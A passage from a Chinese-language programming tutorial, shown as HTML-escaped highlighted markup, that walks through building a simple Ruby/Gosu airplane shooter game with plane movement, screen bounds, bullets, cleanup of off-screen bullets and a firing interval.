  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(这里可能你会感到奇怪, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.button_down&lt;/code&gt;是怎么调用的? 
&lt;del&gt;这就不得不讲一个关于命名空间的笑话了&lt;/del&gt;. 
这是因为我们是在类中写代码的, 所以我们可以直接调用这个方法, 
或者是用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;self.button_down?&lt;/code&gt;的方式在自己内部调用自己的方法. )&lt;/p&gt;

&lt;p&gt;然后还要让我们的飞机能够拥有对应的左右移动的能力:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Plane&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 前面的略去&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# 向左移动      &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mv_left&lt;/span&gt;      
    &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;      
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                
      
  &lt;span class=&quot;c1&quot;&gt;# 向右移动      &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mv_right&lt;/span&gt;      
    &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;      
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(这样一来就可以享受左右横跳的快乐了. )&lt;/p&gt;

&lt;h3 id=&quot;basic-iii-飞机的一点点改进&quot;&gt;Basic III: 飞机的一点点改进&lt;/h3&gt;
&lt;p&gt;(郑重声明: 我没有强迫症)只是我们会发现, 
我们的飞机显示的还是有那么点不尽人意的, 
虽然我们一开始设置的默认位置是在屏幕中间, 
但是实际上飞机显示出来的却是有那么些位移. 
这是因为飞机的图像在绘制的时候是以我们设置的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@x&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@y&lt;/code&gt;为原点, 
向右向下绘制的, 而不是以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@x&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@y&lt;/code&gt;为原点绘制的, 这样多少还是有点差别.&lt;/p&gt;

&lt;p&gt;更加离谱的是, 我们的飞机还可以肆意妄为地飞出屏幕, 这样不是太离谱了吗?&lt;/p&gt;

&lt;p&gt;所以我们要做的就是将这个误差减少并且让这个飞机更加的合理:&lt;/p&gt;

&lt;p&gt;为此, 我们需要一个对飞机中心坐标还有左上角的绘制坐标之间的转换代码, 
以及需要一个判断飞机是否飞出有效区域的代码, 用这个代码来限制飞机能否继续飞. 
最后还要保证原来的代码不必有太多的修改(毕竟这样简单一些).&lt;/p&gt;

&lt;p&gt;首先查阅&lt;a href=&quot;https://www.rubydoc.info/gems/gosu/Gosu/Image&quot;&gt;文档&lt;/a&gt;, 
可以知道载入的图片的大小是可以通过简单的常量调用就可以得知的:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Instance Attribute Summary&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#height =&amp;gt; Integer&lt;/code&gt; &lt;strong&gt;readonly&lt;/strong&gt;  &lt;br /&gt;
The image’s height, in pixels.&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#width =&amp;gt; Integer&lt;/code&gt; &lt;strong&gt;readonly&lt;/strong&gt;  &lt;br /&gt;
The image’s width, in pixels.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;于是我们就可以在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plane#initialize&lt;/code&gt;的时候进行一些新的补充:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Plane&lt;/span&gt;  
  &lt;span class=&quot;c1&quot;&gt;# 初始化的时候在窗口的底部中间  &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;  
    &lt;span class=&quot;c1&quot;&gt;# 飞机的图像  &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rec/plane.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;      
    &lt;span class=&quot;c1&quot;&gt;# 图像的一半长宽  &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@hf_width&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;width&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;  
    &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;                                                   
    
    &lt;span class=&quot;c1&quot;&gt;# @x, @y分别是中心坐标坐标  &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 在绘制的时候就需要计算一下坐标的位置  &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 也就是@x - @hf_width, @y - @hf_height  &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;240&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;                                
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                                                
                                                                                     
  &lt;span class=&quot;c1&quot;&gt;# 画出飞机                                                                         &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;                                                                           
    &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                  
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                                                
                                                                                     
  &lt;span class=&quot;c1&quot;&gt;# 向左移动                                                                         &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mv_left&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 防止飞出左边                                                                        &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;                                                               
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                                                
                                                                                     
  &lt;span class=&quot;c1&quot;&gt;# 向右移动                                                                         &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mv_right&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 防止飞出右边                                                                       &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;480&lt;/span&gt;                                                             
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                                                
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;basic-iv-如法炮制的子弹和炮弹&quot;&gt;Basic IV: 如法炮制的子弹和炮弹&lt;/h3&gt;
&lt;p&gt;类似于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plane&lt;/code&gt;的做法, 我们可以简单的写出子弹&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bullet&lt;/code&gt;类, 障碍物&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ball&lt;/code&gt;类的代码:&lt;/p&gt;

&lt;p&gt;首先是子弹, 飞机一开始只能射击单发的子弹, 接下去确可以射击并排的双发, 
最后在双发的基础上射击向两边散开的子弹.&lt;/p&gt;

&lt;p&gt;所以在程序设计的时候, 我们要考虑有不同档位的子弹. 不过一开始, 
我们还是先实现最简单的子弹设计吧: (单发)&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Bullet&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 输入子弹的起点坐标x, y&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 子弹的图像&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rec/bullet.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;width&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@hf_width&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# 还是一样的, 中心坐标@x, @y             &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;                            
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                        
                                             
  &lt;span class=&quot;c1&quot;&gt;# 目前是向上移动                           &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;move&lt;/span&gt;                                   
    &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;                                 
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                        
                                                       
  &lt;span class=&quot;c1&quot;&gt;# 子弹在飞机的上一层                                   &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;                                               
    &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;      
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                             
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Plane&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;shoot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;bullets&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Bullet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GameWindow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Window&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 子弹的数组                             &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shoot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;button_down?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;KB_UP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# 子弹的移动&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bullet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bullet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;move&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ... &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bullet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bullet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这样以来运行程序的时候我们就可以按住上方向键来射击了. 唯一的问题就是, 
当我们发射了很多子弹的时候, 我们的程序就会变得很慢, 
这是因为我们的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@bullets&lt;/code&gt;数组里面储存了太多的无用子弹了. 
(这些子弹都飞到了屏幕外面看不到了, 却还会继续在代码里面碍事, 
所以我们要像一个办法把这些子弹给删掉. )&lt;/p&gt;

&lt;p&gt;所以第一个优化的地方出现了: 如何删掉无用的子弹? 答案是我们可以像飞机的移动一样做一个判断.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Bullet&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 无用子弹的判断                        &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;within?&lt;/span&gt;                                     
    &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;480&lt;/span&gt; 
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里我们用了一个ruby的特性: 函数的返回值在没有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;return&lt;/code&gt;显式声明的时候, 
就是最后一个表达式的返回值, 也就是我们这里写的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@y &amp;gt; 0 &amp;amp;&amp;amp; @x &amp;gt; 0 &amp;amp;&amp;amp; @x &amp;lt; 480&lt;/code&gt;的返回值. 
这个表达式是一个逻辑表达式, 它的意思是: 只有当&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@y &amp;gt; 0&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@x &amp;gt; 0&lt;/code&gt;以及&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@x &amp;lt; 480&lt;/code&gt;都成立的时候, 
我们才会返回真&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;(没什么用的小知识: 在ruby里面, 大家一般都会用类似的方式来命名自己的函数之类的, 
比如说返回值是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;或者&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;之类的判断方法, 就会用一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt;来结尾, 
象征着查询的意思; 然后那些会修改自身数据的方法, 因为比较危险, 需要注意, 
所以就会用一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!&lt;/code&gt;来强调. 并且一般也相应对应着一个不那么危险的没有感叹号的方法. )&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GameWindow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Window&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 删除无用的子弹                                                                 &lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;                                                                            
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;                                                        
      &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;within?&lt;/span&gt;                                                     
        &lt;span class=&quot;vi&quot;&gt;@bullets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;delete_at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                                        
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;                                                                           
        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;                                                                       
      &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                                            
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                                              
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;等等, 还是有那么点点的小问题的: 我们子弹射得太快了. 一口气就会射出太多的子弹, 
所以我们要为这个射击加一个间隔时间. 为此只需要在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plane&lt;/code&gt;类里面加入一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@last_shoot_time&lt;/code&gt;, 
每次射击的时候就会判断时间间隔是否满足条件.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Plane&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 前一次的射击时间&lt;/span&gt;
